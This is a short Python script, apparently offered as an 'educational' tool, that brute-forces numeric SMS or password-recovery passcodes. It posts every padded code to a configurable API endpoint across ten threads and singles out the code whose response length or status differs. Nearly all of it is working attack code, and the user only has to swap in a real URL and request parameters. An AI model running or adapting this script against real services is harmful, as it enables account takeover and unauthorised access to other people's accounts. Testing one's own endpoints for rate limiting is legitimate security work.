###
# @version 0.9.0
# @author Miikka Kivinen
# A simple tool to demonstrate brute-forcing weak to no security APIs that use x-digit passcodes e.g for password recovery
# This tool is for educational purposes only. Don't be that snowflake who hacks others.
# Change the URL and modify the custom parameters that are sent within the POST request
# Usage: python3 ./smsbrute [-max number of passcodes]
###

import sys
import concurrent.futures
from multiprocessing import freeze_support
import requests

passcode    =   0
pass_list   =   []
url         =   "http://localhost:8081/"  #API url. MODIFY THIS!
potential   =   "Response Comparison"
potentials  =   []

#create passcode list based on given argument
def create_pass_list(args):
    try:
        if (args[1]):
            #we need padding for numbers lesser in length e.g 0003, 0069, 0420...
            pad = len(str(args[1]))
            print("Even with mediocre scripts, comes great responsibility. Don't do anything unlawful!")
            print('Creating passcode list...')
            
            for code in range(int(args[1])):
                pass_list.append(str(code).zfill(pad))
            
            return
    except:    
        print('Usage: python3 ./smsbrute [-max number of passcodes]')

create_pass_list(sys.argv)

#potential candidates comparison
def compare_potentials(potent):
    old_len = 0
    old_status = ''
    status = ''
    content = ''
    code = ''
    for x in potent:
        if (status == ''):
            status = x['status']
            content = x['content']
            old_len = len(x['content'])
        if (status != x['status']):
            print(f'Status code comparison: Old {status} --> Deviant {x["status"]}')
            status = x['status']
            code = x['code']
        if (len(content) != len(x['content'])):
            print(f'Response content deviation: Possible code is {x["code"]}')
            if (len(x['content']) != old_len):
                old_len = len(content)
                content = x['content']
                code = x['code']
    
    print('---------------------')
    if code:
        print(f'Result: Your code for {url} is {code}')
    if not code:
        print('No matching code found')


#make the API call
def api_call(param):
    global potential
    global potentials
    params = {"id" : 3, "name" : "Markku", "smscode" : "%s" % param} #POST request paramters. MODIFY THIS!
    resp = requests.post(url, data=params)

    if (len(str(resp.content)) != len(potential)):
        print('Response packet length differs from others. Possible code is %s' % param)
        potentials.append({'content' : str(resp.content), 'status' : str(resp.status_code), 'code' : param})
        potential = str(resp.content)
        

def main():
    print('Fetching API calls...')
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as workers:
        fs = [workers.submit(api_call, param) for param in pass_list]
        concurrent.futures.wait(fs, timeout=360)

if __name__ == '__main__':
    freeze_support()
    main()

if potentials:
    print('Potential candidates found. Making comparison of response content...')
    compare_potentials(potentials)
if not potentials:
    print('No potential candidates found')